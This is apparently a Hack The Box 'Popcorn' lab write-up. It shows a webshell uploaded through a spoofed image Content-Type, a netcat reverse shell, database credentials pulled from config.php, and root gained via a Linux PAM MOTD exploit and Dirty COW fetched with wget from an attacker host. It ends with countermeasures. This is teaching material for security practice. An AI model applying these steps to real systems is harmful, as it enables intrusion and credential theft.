## Vulnerability Discovery (Weak file upload filters)

The web service hosted the default Apache welcome page, so I poked further to discover more content on the web server with `gobuster`:

```

Out of all of the discovered paths, the most interesting one was `/torrent/` which presented me with the following page:

![](/assets/images/htb-popcorn/popcorn-torrent-hoster-home.png)

Whenever I see a PHP application, the first thing that comes to mind is: how can I upload a webshell?
From here, I noticed the section where I could upload a file. However, I first needed to create an account so that I could be authroized to upload a file:

![](/assets/images/htb-popcorn/popcorn-signup.png)

After creating an account and logging in, I navigated to the section where I could upload a file:

![](/assets/images/htb-popcorn/popcorn-upload-torrent.png)

As seen in the image above, I uploaded a valid torrent file that didn't yet exist on the popcorn host.

I then tried uploading a PHP webshell, though the Torrent Hosting application prevented me from uploading it despite my efforts at attempting to bypass the file extension and MIME checking filter:

![](/assets/images/htb-popcorn/popcorn-not-a-valid-torrent-file.png)

At this point, I continued to explore Torrent Hoster for more attack vectors where I could upload a webshell.
Since I previously uploaded a valid torrent file, I navigated to the section of Torrent Hoster where I could browse torrents I previously uploaded:

![](/assets/images/htb-popcorn/popcorn-torrent-info.png)

Below, I noticed a screenshot section. I figured I might be able to upload a webshell there:

![](/assets/images/htb-popcorn/popcorn-change-torrent-screenshot-webshell.png)

I proxied the request through Burp Suite so that if there were any MIME and/or file extension filters, I could try to bypass them:

![](/assets/images/htb-popcorn/popcorn-burp-invalid-screenshot-file.png)

As seen above, there were some basic MIME and/or file extension filters in place. After some tampering, I learned a weak MIME content type filter was in place. However, after bypassing the MIME content type filter, I realized that the file extensions weren't being checked which is very important for securing PHP applications from remote code execution.

![](/assets/images/htb-popcorn/popcorn-webshell-upload-success.png)

Notice how I only needed to change the `Content-Type` header to represent PNG content to bypass the MIME checking filter. From the response, it looked like my PHP webshell was successfully uploaded!

At this point, I needed the popcorn host to execute my PHP webshell to connect back to my netcat listener. I simply clicked on the placeholder for where my torrent thubnail was supposed to be uploaded to get my browser to send a web request to my webshell which in turn would make the web server execute it:

![](/assets/images/htb-popcorn/popcorn-execute-webshell.png)

```

After [upgrading my netcat shell to a pseudo pty with python](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2), I had a low-privileged shell and was able to capture the `user.txt` flag:

```
www-data@popcorn:/var/www/torrent$ cat /home/george/user.txt
5e36a919398ecc5d5c110f2d865cf136
```

## Privilege Escalation (CVE-2010-0832)

After capturing the user flag, I like do some basic privilege escalation checks. Whenever there is a web application running on the host, I like to check for credential reuse since a username and password is generally required to connect to its database:

Below is how I found the database credentials:

```
www-data@popcorn:/var/www/torrent$ grep --color -RiE 'pwd|passw' *
... CONTENT SNIPPED ...
config.php:  $CFG->dbPassword = "SuperSecret!!";        //db password
config.php:     $dbpass         = $CFG->dbPassword;
config.php:  //start session to hold username and password when linking from page to page
config.php:  db_connect($CFG->host, $CFG->dbName, $CFG->dbUserName, $CFG->dbPassword);
```

```
www-data@popcorn:/var/www/torrent$ grep CFG config.php
  ... CONTENT SNIPPED ...
  $CFG->host = "localhost";
  $CFG->dbName = "torrenthoster";       //db name
  $CFG->dbUserName = "torrent";    //db username
  $CFG->dbPassword = "SuperSecret!!";   //db password
  ... CONTENT SNIPPED ...
```

The database credentials were located in `/var/www/torrent/config.php`. Do note that I was not able to reuse these credentials to login as the `root` or `george` user.
The next thing I like to do after compromising database credentials is to look for other application-based passwords that were set by administrators for credential reuse.
I connected to the Torrent Hoster application's database and extracted the Admin user's password hash, but was unable to crack it within a reasonable amount of time.

```
mysql> select * from users;
+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
| id | userName | password                         | privilege | email                | joined              | lastconnect         |
+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
|  3 | Admin    | d5bfedcee289e5e05b86daad8ee3e2e2 | admin     | admin@yourdomain.com | 2007-01-06 21:12:46 | 2007-01-06 21:12:46 |

+----+----------+----------------------------------+-----------+----------------------+---------------------+---------------------+
```

At this point, I proceeded to check if the Linux kernel was outdated:

```
iwww-data@popcorn:~$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```

As seen above, the linux kernel version is extremely outdated and is vulnerable to the Dirty Cow exploit which makes it trivial for an attacker to escalate their privileges to root on the system. However, since the [Dirty Cow](https://dirtycow.ninja/) exploit normally causes system instability, I will compile and run it later in this report.

The next basic check I like to do as a user that shouldn't have interactive shell access is to enumerate user directories for sensitive information and artifacts that potentially indicate the installation of vulnerable/outdated software:

```
www-data@popcorn:~$ find /home -ls
 89588    4 drwxr-xr-x   3 root     root         4096 Mar 17  2017 /home

   107    4 -rw-r--r--   1 george   george        675 Mar 17  2017 /home/george/.profile
```

The most suspicious file here was `/home/george/.cache/motd.legal-displayed` since it indicated the existence of the Linux PAM module. I went ahead and checked for the installed version of the Linux PAM module installed on the popcorn host:

```
www-data@popcorn:/dev/shm$ dpkg -l | grep pam
ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules for PAM
ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support for the PAM library
ii  libpam0g                            1.1.0-2ubuntu1                    Pluggable Authentication Modules library
ii  python-pam                          0.4.2-12ubuntu3                   A Python interface to the PAM library
```

I then searched for existing exploits against `Linux pam`:

```
$ searchsploit linux pam | grep local

```

I went ahead and mirror'ed `Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)`:

```bash
searchsploit -m linux/local/14339.sh
```

I then transferred the exploit to the popcorn machine over HTTP:

```
$ python3 -m http.server

```

Note: If the exploit doesn't work out of the box, it is likely because SSH key-based authentication isn't properly setup for your current user.
You can fix this by running the following script. **Only do this if your current user doesn't have SSH configured since the script below will overwrite your existing SSH keys!**

```bash
mkdir ~/.ssh
ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub > ~/.ssh/authorized_keys
chmod -R 700 ~/.ssh
```

## Privilege Escalation (Dirty Cow CVE-2016-5195)

Search for a dirty cow exploit that will compile on the x86 system:

```
$ searchsploit dirty cow

---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

I then mirrored the `Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)` exploit:

```bash
searchsploit -m linux/local/40839.c
```

I then hosted the exploit on my local HTTP server with:

```bash
python3 -m http.server
```

And made the popcorn machine download it from my kali machine: 

```
www-data@popcorn:/dev/shm$ wget http://10.10.14.24:8000/40839.c
--2020-09-06 23:04:38--  http://10.10.14.24:8000/40839.c

```

Next, I compiled and ran it:

```
www-data@popcorn:/dev/shm$ gcc -pthread 40839.c -o dirty -lcrypt
www-data@popcorn:/dev/shm$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak

```

At this point, I was able to login via SSH as the `firefart` user with the password I specified when running the exploit:

```
$ ssh firefart@10.10.10.6
firefart@10.10.10.6's password:

As seen above, the `firefart` user had root privileges indicating a full compromise of the popcorn host.

## Countermeasures

* Update the torrent hoster software to the latest version currently available. If the software happens to be at the latest version, then patch the vulnerability where webshells can be uploaded as screenshots by spoofing the MIME type. Ideally, the file contents should be checked upon upload as well as filename extensions.
* Update the Linux PAM module to the latest version currently available so that privilege escalation via Linux PAM abuse (CVE-2010-0832) can be patched.
* Update the operating system to the latest version currently available so that it won't be vulnerable to the Dirty Cow privilege escalation exploit.
